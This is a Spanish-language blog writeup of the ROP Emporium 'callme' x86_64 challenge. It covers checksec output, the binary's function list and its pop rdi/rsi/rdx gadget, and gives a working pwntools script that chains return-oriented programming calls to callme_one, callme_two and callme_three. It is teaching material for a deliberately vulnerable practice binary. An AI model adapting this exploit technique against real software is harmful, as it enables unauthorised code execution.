---
layout: post
title: Callme ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este es el segundo post de la serie de writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html). Con esta serie de posts aprenderemos sobre una de las técnicas más utilizadas en la explotación de binarios, la [***ROP***]({% post_url 2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

Concretamente en este reto, utilizaremos *ROP gadgets* para llamar a varias funciones pasándoles argumentos.

# x86_64 (Intended)
## Reconocimiento

Como siempre comenzamos lanzando [[checksec]]:

```checksec
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

Vemos que la ejecución es igual que el [ejercicio anterior]({% post_url 2024-08-15-Split-ROP-Emporium %}). Así que analizaremos directamente las funciones con gdb-pwndbg:

```gdb
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
```

En el enunciado se nos dice:

> You must call the `callme_one()`, `callme_two()` and `callme_three()` functions in that order, each with the arguments `0xdeadbeef`,  `0xcafebabe`, `0xd00df00d` e.g. `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)` to print the flag. **For the x86_64 binary** double up those values, e.g. `callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`.
> The solution here is simple enough, use your knowledge about what resides in the PLT to call the `callme_` functions in the above order and with the correct arguments. If you're taking on the MIPS version of this challenge, don't forget about the branch delay slot.
> _Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order._

En resumen, deberemos llamar a las funciones *callme_* en el orden correcto, pasando los argumentos correctos.

En *usefulGadgets* se nos dan los gadgets necesarios para colocar los argumentos:

```asm
disass usefulGadgets

Dump of assembler code for function usefulGadgets:
0x000000000040093c <+0>:	pop    rdi
0x000000000040093d <+1>:	pop    rsi
0x000000000040093e <+2>:	pop    rdx
0x000000000040093f <+3>:	ret
```

También tenemos las direcciones de las funciones a llamar que tienen la peculiaridad de, al ser *dynamically linked*, encontrarse en la PLT.

## Explotación

El script llamará por cada función, a los gadgets, seguidos de los parámetros (almacenados en *rdi*, *rsi* y *rdx*) y por último, a la propia función. Así quedaría:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
context.bits=64
exe = './callme'


def start():
    
    if args.REMOTE:
        return remote()
    else:
        return process(exe)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

padding=40*b'A' #Same as split (previous challenge)

callme_1=p64(0x0000000000400720)
callme_2=p64(0x0000000000400740)
callme_3=p64(0x00000000004006f0)

pop_3_ret=p64(0x000000000040093c)

deadbeef=p64(0xdeadbeefdeadbeef)
cafebabe=p64(0xcafebabecafebabe)
doodfood=p64(0xd00df00dd00df00d)

args = deadbeef + cafebabe + doodfood

payload = padding + pop_3_ret + args + callme_1
payload += pop_3_ret + args + callme_2
payload += pop_3_ret + args + callme_3

io.sendline(payload)
io.interactive()
```

Un reto también sencillo pero que refresca y afianza conceptos para los siguientes. ¡Nos vemos en el próximo post!